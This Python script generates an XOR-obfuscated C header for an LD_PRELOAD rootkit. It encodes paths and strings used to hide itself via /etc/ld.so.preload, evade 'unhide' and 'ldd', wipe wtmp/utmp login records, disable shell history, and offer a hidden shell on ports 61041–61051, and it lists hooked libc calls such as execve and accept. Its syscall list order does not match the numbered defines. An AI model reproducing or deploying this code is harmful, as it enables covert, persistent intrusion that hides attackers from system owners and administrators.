#!/usr/bin/env python3


def xor(x_str):
    result = []

    for x in x_str:
        xor_char = ord(x) ^ 0xfe
        hex_char = hex(xor_char)[2:]  # remove prefix 0x
        result.append(f'\\x{hex_char}')

    return ''.join(result)


header_template = '''#define _GNU_SOURCE
#pragma once
//#define DEBUG_APP
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define MAGIC_STRING\t"{magic_string}"
#define CONFIG_FILE\t"{config_file}"
#define C_UNHIDE\t"{c_unhide}"
#define C_LDD\t"{c_ldd}"
#define LD_TRACE\t"{ld_trace}"
#define LD_LINUX\t"{ld_linux}"
#define LD_NORMAL\t"{ld_normal}"
#define LD_HIDE\t"{ld_hide}"
#define CLEANUP_LOGS\t"{cleanup_logs}"
#define WTMP_FILE_X\t"{wtmp_file}"
#define UTMP_FILE_X\t"{utmp_file}"
#define SHELL_TYPE\t"{shell_type}"
#define HIDE_TERM_VAR\t"{hide_term_var}"
#define HIST_FILE\t"{hist_file}"
#define TERM\t"{term}"
#define SYS_WRITE\t"{sys_write}"
#define SYS_READ\t"{sys_read}"
#define SHELL_MSG\t"{shell_msg}"

#define MAX_LEN 1024

#define LOW_PORT\t{low_port}
#define HIGH_PORT\t{high_port}

#define O_RDWR 02
#define O_RDONLY 00

#define SYS_ACCESS 0
#define SYS_READDIR 1
#define SYS_FOPEN 2
#define SYS_OPENDIR 3
#define SYS_OPEN 4
#define SYS_RMDIR 5
#define SYS_LINK 6
#define SYS_UNLINK 7
#define SYS_XSTAT 8
#define SYS_LXSTAT 9
#define SYS_UNLINKAT 10
#define SYS_MKDIR 11
#define SYS_MKDIRAT 12
#define SYS_EXECVE 13
#define SYS_ACCEPT 14

#define SYSCALL_SIZE 15

static char *syscall_table[SYSCALL_SIZE] = {{
'''

syscalls = [
    "access",
    "readdir",
    "fopen",
    "opendir",
    "open",
    "rmdir",
    "link",
    "unlink",
    "unlinkat",
    "stat",
    "lstat",
    "mkdir",
    "mkdirat",
    "execve",
    "accept"
]

header = header_template.format(
    magic_string="__",
    config_file=xor("ld.so.preload"),
    c_unhide=xor("bin/unhide"),
    c_ldd=xor("bin/ldd"),
    ld_trace=xor("LD_TRACE_LOADED_OBJECTS"),
    ld_linux=xor("ld-linux"),
    ld_normal=xor("/etc/ld.so.preload"),
    ld_hide=xor("/etc/__ld.so.preload"),
    cleanup_logs=xor("CLEANUP_LOGS"),
    wtmp_file=xor("/var/log/wtmp"),
    utmp_file=xor("/var/run/utmp"),
    shell_type=xor("/bin/sh"),
    hide_term_var=xor("HIDE_THIS_SHELL=foobar"),
    hist_file=xor("HISTFILE=/dev/null"),
    term=xor("TERM=xterm"),
    sys_write=xor("write"),
    sys_read=xor("read"),
    shell_msg=xor("Welcome to the shell!\n"),
    low_port=61041,
    high_port=61051,
)

# XOR the syscall names and format them into a list
syscall_list = ', '.join(f'"{xor(call)}"' for call in syscalls)

# Print the final output
print(header)
print(syscall_list + '};')

